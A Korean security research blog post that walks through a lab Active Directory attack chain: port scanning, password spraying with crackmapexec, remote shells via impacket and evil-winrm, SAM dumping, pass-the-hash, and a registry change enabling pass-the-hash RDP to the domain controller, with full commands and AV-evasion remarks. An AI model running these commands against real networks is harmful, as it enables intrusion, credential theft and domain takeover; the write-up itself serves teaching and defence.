---
layout: post
title:  "Active Directory 환경에서의 윈도우 후속 공격"
author: "xeona"
comments: true
tags: [Research]
---
# Active Directory 환경에서의 윈도우 후속 공격

라온시큐어 핵심연구팀 이선아 

### 1. 연구 배경

국내 기업에서는 윈도우 운영체제를 보편적으로 사용하고 있습니다. 대기업 뿐만 아니라 중견, 중소기업에서도 윈도우 환경의 인프라를 효율적으로 관리하고 제어하기 위해 Active Directory 환경을 갖춰 운영하고 있습니다. 

실제로 다수의 기업에서 Active Directory 환경에서 인프라를 운영하고 있지만 여러 원인으로 인해 보안 위협에 노출되고 있습니다. 내부 서버 개수가 통제가능한 선 이상으로 많거나 불명확한 대역 구분, 사용자 권한 부여 및 회수 문제 등 다양합니다. 이는 공격자 측면에서는 충분한 Attack hole이 될 수 있습니다. 나아가 내부망에서 측면이동(레터럴 무브먼트) 가능성이 존재하며, Domain Controller 장악까지 가능할 수 있다는 것을 내포합니다. 

따라서 본 연구는 공격자의 관점에서 바라본 ‘Active Directory 환경에서의 윈도우 후속 공격’에 대해 설명하고자 합니다. 제한된 환경(프로토콜별) 안에서 공격자가 어떤 후속 공격을 진행할 수 있는지에 대해 알아보고, 이를 종합적으로 이용하여 Domain Controller 권한 상승으로 이어지는 시나리오에 대해 설명하도록 하겠습니다.

## 2. 환경 설정

### **2.1. 환경 개요**

< 환경 가정 > 

내부 임직원 PC가 랜섬웨어에 감염되어 공격자가 이미 내부망에 초기 침투가 완료된 상태임을 가정합니다. 내부 임직원 PC들은 모두 WINDOWS 10 사용 중이며, 내부망에서는 Active Directory 환경에서 운영 및 관리되고 있습니다. 또한, 초기 침투 과정에서 일부 크리덴셜을 확보한 상태입니다. 

![image.png](image.png)

### **2.2 인프라 구성**

- 공격자가 확보한 공격 PC : 192.168.134.130
- 내부 임직원 PC : 192.168.134.131, 192.168.134.138
- Active Directory Domain Controller : 192.168.134.133
- Root domain name : xeona.local

### **2.3 서비스 포트**

침투테스팅 환경에서는 내부망 대역 내 자산 식별이 무엇보다 중요합니다. 내부 서비스를 식별하기 위해 포트 스캐닝을 통해 어떤 호스트에 어떤 포트가 오픈되어 서비스 중인지 확인합니다. 보통 Domain Controller를 구분하기 위해 호스트 이름에 DC를 포함하는 경우가 실제로 많으며, 도메인명 xeona.local을 사용하고 있음을 알 수 있습니다.

```jsx
nmap -sT --top-ports 3000 192.168.134.0/24
```

192.168.134.131 (USER1-PC) 스캔 결과

![image.png](image%201.png)

192.168.134.133 (WIN-DC) 스캔 결과

![image.png](image%202.png)

192.168.134.138 (TEST-PC) 스캔 결과

![image.png](image%203.png)

## 3. Active Directory 환경에서의 후속 공격

Active Directory 환경으로 구성된 내부망에 침투한 공격자는 네트워크 내의 권한 상승을 시도하여, 점차적으로 권한을 확대해 도메인 관리자와 같은 높은 권한 확보를 목표로 공격을 진행하게 됩니다. 이를 위해 선제적으로 서버나 다른 호스트의 시스템 제어권 확보가 중요합니다. 공격자가 향후 공격을 계속 확장할 수 있는 중요한 단계이며, 그 과정에서 추가적인 기업의 중요 데이터 및 크리덴셜 등을 수집할 수 있습니다. 

따라서, 다음 내용으로 내부 네트워크에서 상이하게 사용되는 프로토콜별 제한된 환경에서의 시스템 제어권 획득 방법을 설명합니다.

### **3-1. 제한된 환경에서 시스템 제어권 탈취 (SMB, WINRM, RDP를 중심으로)**

1. crackmapexec

네트워크에 대한 침투 테스팅 도구로 많이 사용되는 도구로, crackmapexec가 있습니다. crackmapexec는 대규모 네트워크 환경에서 효율적으로 exploit하기 위해 용이하며, 사용가능한 프로토콜이 7개(smb, ftp, rdp, ssh, winrm , mssql, ldap)로 제한적입니다.

[CrackMapExec, Software S0488 | MITRE ATT&CK®](https://attack.mitre.org/software/S0488/)

![image.png](image%204.png)

대역에 존재하는 다수의 호스트에서 SMB가 활성화되어 있다는 점을 이용하여 crackmapexec 도구를 이용해 보다 효율적으로 대역대의 상세 정보를 수집합니다. 

```bash
crackmapexec smb 192.168.134.0/24
```

![image.png](image%205.png)

crackmapexec 옵션을 통해 유효한 계정 식별이 가능합니다. 정보 수집 단계에서 유효한 크리덴셜을 확보했다는 가정 하에 로그인 시도를 진행합니다. 

```jsx
crackmapexec smb 192.168.134.0/24 -u user1 -p 'Password1!@'
```

![image.png](image%206.png)

로그인 실패 시 [-]가 표시되고, 로그인 성공 시 [+]가 표시됩니다.

TEST-PC, WIN-DC 2개의 호스트에 대해서 user1/Password1!@ 이라는 계정 정보가 유효하다는 것을 알 수 있습니다. 

여기서 한 가지 특이점이 있습니다.

crackmapexec를 통해 확인한 결과를 보면 두 호스트에 대해서 [+] 로 로그인 성공이나, TEST-PC(192.168.134.138) 호스트에 대해서만 `Pwn3d!` 메시지가 표시되었습니다.  이는 로컬 관리자 액세스가 가능한지 여부에 따라 달라집니다. 즉, user1은 TEST-PC에 대해 로컬 관리자 액세스 권한이 있지만, WIN-DC Domain Controller에 대해서는 로컬 관리자 액세스가 불가능하다는 것을 나타냅니다.

crackmapexec -x 옵션을 통해서 원격명령 실행이 가능합니다. 단, 로컬 관리자 액세스 권한이 있는 계정이 필요합니다. crackmapexec로 원격명령 실행이 가능하여 시스템 제어가 가능하나, crackmapexec는 대화형 원격 명령 수행이 불가하다는 한계점을 가지고 있습니다.

```jsx
crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x whoami
```

![image.png](image%207.png)

1. impacket-psexec

impacket은 네트워크 프로토콜을 다루는 Python 모듈입니다. 이 모듈들은 네트워크 패킷에 대해 low-level에서 분석하며 다양한 기능을 제공합니다. 그 중 impacket-psexec는 Windows 호스트에서 대화형 shell을 제공합니다.

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

impacket-psexec 모듈을 이용하기 위해서는 다음과 같은 전제조건이 반드시 필요합니다.

`전제조건`

1. SMB(135,445) open
2. 방화벽 / Anti-Virus 탐지 유무 
3. 로컬 관리자 그룹 내 포함된 유저 자격 증명

crackmapexec와 다르게 impacket-psexec는 대화형 shell을 받아 사용할 수 있다는 편리함이 있습니다. 크리덴셜 수집을 통해 로컬 관리자 그룹에 포함된 사용자의 계정 정보를 알고 있다면 원격에서 바로 시스템 명령 실행이 가능합니다. 

```jsx
impacket-psexec 'XEONA11/user1:Password1!@'@192.168.134.138
```

![image.png](image%208.png)

단, impacket-psexec 모듈 사용 시 바로 로컬에 exe 파일을 원격 업로드하게 되는데, 이때 높은 확률로 Windows Defender에서 멀웨어로 탐지합니다. 낮은 버전의 Windows OS 또는 AV 탐지 등 보안 정책이 없는 환경에서만 원격으로 대화형 쉘에 연결할 수 있습니다.

![image.png](image%209.png)

1. impacket-smbexec

반대로, impacket-smbexec 모듈은 Anti-Virus 상관없이 방화벽 정책으로 SMB를 Allow한다면 정상적으로 원격 명령 수행이 가능합니다. 

![image.png](image%2010.png)

이벤트 로그를 확인해보면, impacket-psexec와는 다르게 로컬 디스크에 실행파일을 저장 후 실행하지 않습니다. 사용자가 보낸 명령을 표준입출력을 통해 내용을 전달한 뒤 삭제하기 때문에 Windows Anti-Virus에서 탐지되지 않습니다. 

하지만, impacket-smbexec의 경우 대화형 shell 같아보이지만, 사용자의 입력값을 받아야 하는 명령 수행 시 사용에 제한이 있습니다. 명령 실행에 대한 결과를 파일 형태로 저장하여 전달하는 방식이기 때문입니다.

![image.png](image%2011.png)

|  | Crackmapexec (smb) | impacket-psexec | impacket-smbexec |
| --- | --- | --- | --- |
| Anti-Virus detect | X | O | X |
| 로컬 관리자 계정   | O | O | O |
| 대화형 shell | X | O | X |

1. evil-winrm

winrm(Windows Remote Management)는 마이크로소프트에서 윈도우 시스템의 원격 관리를 하는 데에 이용되는 프로토콜로, 기본적으로 HTTP 프로토콜을 통해 SOAP(XML 기반의 메시지를 교환)를 활용하여 작동합니다. 

- 전제조건
1. 5985, 5986 포트 오픈
2. 로컬 관리자 그룹 내 포함된 유저 자격 증명

winrm을 사용하기에 앞서, 기본적으로 5985 또는 5986 포트가 오픈되어있어야 합니다.

crackmapexec에서도 프로토콜 winrm을 지원합니다.  crackmapexec를 통해 유효한 자격증명인지 확인이 가능하며, USER1-PC에 대하여 user1은 로그인이 가능하기에 Pwn3d! 라는 메시지를 응답합니다. winrm이 활성화되어 있는 호스트에 대해 로컬 관리자 로그인 권한이 있는 user1은 -x 옵션을 이용하여 원격 명령 실행이 가능합니다.

하지만, crackmapexec 특성상 대화형 쉘을 사용할 수 없는 것은 마찬가지입니다.

![image.png](image%2012.png)

winrm을 이용하는 대표적인 침투 테스팅 도구로는 evil-winrm이 있습니다. 메모리에 Powershell 스크립트를 로드하여 동작하기 때문에, Anti-Virus 탐지가 되지 않습니다.

[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

crackmapexec와는 다르게 evil-winrm 을 이용하면 winrm을 통해 대화형 Powershell을 얻을 수 있습니다. psexec, smbexec는 경로 이동 제한 등 명령 수행에 불편함이 존재하는데, evil-winrm는 보다 수월한 원격 명령이 가능합니다. 단, shell을 사용하려면 로컬 관리자 권한을 가진 계정 정보가 있어야 하는 제약 조건이 있습니다.

```bash
evil-winrm -i 192.168.134.138 -u user1 -p 'Password1!@' 
```

![image.png](image%2013.png)

WIN-DC Domain Controller에 로컬 관리자 권한이 없는 user1으로 접근 시, 쉘을 얻을 수 없습니다.

![image.png](image%2014.png)

1. RDP

가장 친숙하며, 공격자 입장에서 가장 효율적인 방법으로는 RDP를 이용하여 원격으로 윈도우 PC에 접속하는 것입니다.

crackmapexec에서 RDP를 지원하기 때문에, 탈취한 크리덴셜을 이용해 유효한 계정이 존재하는지 확인할 수 있습니다.  동일하게 Pwn3d! 메세지 응답 시 RDP 접속이 가능하다는 결과를 나타냅니다.

```jsx
crackmapexec rdp 192.168.134.0/24 -u id_list.txt -p 'Password1!@' 
```

![image.png](image%2015.png)

### **3-2. 잘못된 권한 설정을 통한 AD Domain Controller 권한 상승 시나리오**

앞서 알아본 시스템 제어권 획득 과정 수행 후 공격자는 더 높은 권한을 확보하기 위해 권한 상승을 진행합니다. Active Directory에서 Domain Controller로의 권한 상승은 시스템 내 모든 자원에 접근하고 조작할 수 있기 때문에, 파급력 큰 행위입니다. 공격자가 네트워크 전체를 장악하거나 중요 데이터를 탈취하는 데 필수적입니다. 

3-1에서 알아본 다양한 방법을 종합적으로 이용하여 Active Directory 환경에서의 AD Domain Controller 권한 상승 시나리오에 대해 설명하고자 합니다. 사전에 수집한 다수의 크리덴셜을 확보했다는 가정 하에 진행합니다.

1. Active Directory환경에서의 포트 스캔 및 호스트 정보 수집

Active Directory 환경에서는 다수의 호스트가 존재하기에 crackmapexec 도구를 이용해 보다 효율적으로 내부망 자산 식별이 가능합니다. 호스트 이름을 통해 해당 호스트의 기능을 파악합니다.

```bash
crackmapexec smb 192.168.134.0/24
```

![image.png](image%2016.png)

1. 패스워드 스프레이 공격을 통한 유효한 계정 정보 식별

사전에 수집한 크리덴셜을 선정하여 패스워드 스프레이 공격을 진행합니다. crackmapexec를 이용하여 내부 대역대 전체에 로그인 가능한 호스트가 존재하는지 여부를 확인할 수 있습니다. 패스워드 스프레이의 경우, 인증 횟수 제한 5회에 걸리지 않도록 진행하는 것이 중요합니다. 브루트포싱 공격처럼 1개의 계정에 다수의 크리덴셜로 패스워드 스프레이를 진행할 경우, 계정 잠금 이슈가 발생할 수 있기 때문입니다. 아래와 같이 대표적으로 사용하는 것으로 보이거나 가능성이 높은 크리덴셜을 선별하여 5회 이내로 진행합니다. 

```jsx
crackmapexec smb 192.168.134.0/24 -u id_list.txt -p "Password1!@"
```

![image.png](image%2017.png)

1. 원격 명령 실행

crackmapexec 옵션 중 -x를 이용하여 원격명령 실행이 가능함을 확인합니다.

```jsx
crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x whoami
```

![image.png](image%207.png)

1. Domain Admins 그룹 내 사용자 식별

user1 도메인 계정으로 로그인이 가능하며, `net user /domain`을 통해 현재 도메인에 포함되어 있는 또 다른 유저 목록을 조회합니다.

```jsx
crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x "net user /domain"
```

![image.png](image%2018.png)

사용자 그룹 중 유일하게 가장 높은 권한이 있는 “Domain Admins” 그룹에 소속된 사용자를 식별합니다. Domain Admins 그룹의 특징은 도메인 서버의 관리자 권한을 가지고 있습니다. MS 공식 자료에 따르면, Domain Admins 그룹에 소속한 사용자는 기본적으로 모든 구성원 서버 및 해당 도메인에 로컬 관리자 그룹의 구성원이 됩니다.  

아래 그림과 같이 도메인 유저 중 testerA가 높은 권한을 가지고 있습니다.

```jsx
crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x 'net group /domain "Domain Admins"'
```

![image.png](image%2019.png)

실제로 USER1-PC에서 로컬 관리자 그룹 조회 시  Domain Admins 그룹도 포함되어 있음을 알 수 있습니다. testerA는 Domain Admins 그룹 유저이기 때문에 USER1-PC 뿐만 아니라 WIN-DC Domain Controller에 대해서도 로컬 관리자 로그인도 가능합니다. Domain Admins 그룹은 도메인에 가입되어 있는 모든 호스트의 Administrator 그룹에 소속되어 있기 때문에,  해당 그룹 소속 계정에 대한 관리가 중요합니다.

![image.png](image%2020.png)

1. Pass-the-Hash를 통한 Domain Controller Administrator 권한 탈취

추가 정보 수집 또는 다크웹 등을 통해서 확보한 크리덴셜을 통해 testerA 계정의 패스워드 평문을 찾아냈다면, 이를 이용하여 Domain Controller의 administrator 계정도 탈취할 수 있습니다. testerA 사용자 권한이 Domain Controller의 로컬 관리자 권한과 동일하기 때문에, WIN-DC의 SAM 정보 탈취가 가능합니다. 

```jsx
crackmapexec smb 192.168.134.133 -u testerA -p 'raon12!@' --sam
```

![image.png](image%2021.png)

WIN-DC Administrator의 평문 패스워드를 모르더라도 SAM 통해 탈취한 NTLM 해시로  권한 상승이 가능합니다. NTLM 해시를 hashcat과 같은 도구를 통해 크랙해도 되지만, Pass-the-Hash로 Domain Controller 권한의 shell을 획득할 수 있습니다. 이는 Domain Controller 그룹 내 계정 관리 소홀로 인해 AD Administrator 권한 상승까지 이어질 수 있음을 보여줍니다.

```jsx
crackmapexec smb 192.168.134.133 -u Administrator -H '0df422499b942b1c7d37fe44191daa2f' -x whoami
```

![image.png](image%2022.png)

1. 원활한 내부 정찰을 위한 Domain Controller Administrator RDP 연결

원활한 Domain Controller 접근을 위해 WIN-DC의 Administrator 권한으로 원격 데스크톱 연결을 시도합니다. RDP를 사용하기 위해서 원격에서 레지스트리 키를 추가하여 칼리 리눅스에서 윈도우 RDP로 붙을 수 있습니다. 해당 레지스트리 키는 원격 로그인이 가능하도록 제한을 해제한다는 내용입니다.

```bash
crackmapexec smb 192.168.134.133 -u Administrator -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

![image.png](image%2023.png)

`HKLM\System\CurrentControlSet\Control\Lsa` 해당 레지스트리는 윈도우 자격 증명에 관한 키 값을 가지고 있는데, 기본적으로 LSA 프로세스를 보호하기 위해 설정되어 있습니다. 여기에 임의로 원격 관리가 가능하도록 키 값을 추가하면 칼리 리눅스(공격자 PC)에서 윈도우로 원격 데스크톱 연결이 가능합니다.

![image.png](image%2024.png)

아래 그림처럼, 칼리 내장 도구인 xfreerdp를 이용해 Domain Controller 평문 패스워드없이 WIN-DC의 원격 데스트톱 연결이 가능한 것을 확인할 수 있습니다. 공격자 입장에서 RDP 연결을 통해 가장 효율적이고 편리하게 시스템 제어가 가능합니다.

```bash
xfreerdp /v:192.168.134.133 /u:administrator /pth:0df422499b942b1c7d37fe44191daa2f /tls-seclevel:0
```

![image.png](image%2025.png)

## 4. 결론

본 연구에서는 Active Directory 환경에서 발생할 수 있는 후속 공격을 바탕으로 분석하여 Domain Controller 권한 상승 시나리오를 설명하였습니다. 공격자의 관점에서 Active Directory 환경에서의 구체적인 공격 기법을 다루며, 나아가 Domain Admins 그룹 사용자 관리 문제는 Domain Controller 권한 상승으로 이어질 수 있음을 보여줌으로써 Active Directory 보안의 중요성을 강조하고자 합니다.

이러한 보안 위협을 사전에 방지하기 위해서는 불필요하게 Domain Admins 그룹 내 임의의 사용자를 포함하지 않거나 엄격한 패스워드 규칙, 네트워크 망간 분리를 통한 측면 이동 방지 등 종합적인 보안 대책이 필요합니다. 많은 자원과 인프라를 관리해야 하는 Active Directory 환경 안에서 발생한 보안 위협은 기업의 막대한 피해와 손실을 야기하므로, 대외서비스 보안 점검 뿐만 아니라 내부 환경에서의 보안에도 신경써야 합니다.

## 참고

[https://book.hacktricks.xyz/kr/network-services-pentesting/pentesting-smb](https://book.hacktricks.xyz/kr/network-services-pentesting/pentesting-smb)

https://medium.com/@S3Curiosity/exploring-evil-winrm-a-powerful-ethical-hacking-tool-for-windows-environments-21918b56f18a

[https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)

[https://abhijithraom.medium.com/lateral-movement-detections-psexec-like-psexec-tools-activity-a305791280f7](https://abhijithraom.medium.com/lateral-movement-detections-psexec-like-psexec-tools-activity-a305791280f7)

[https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef](https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef)

[https://voyag3r-security.medium.com/remote-access-a-look-at-impackets-psexec-and-smbexec-b60cce7a57bc](https://voyag3r-security.medium.com/remote-access-a-look-at-impackets-psexec-and-smbexec-b60cce7a57bc)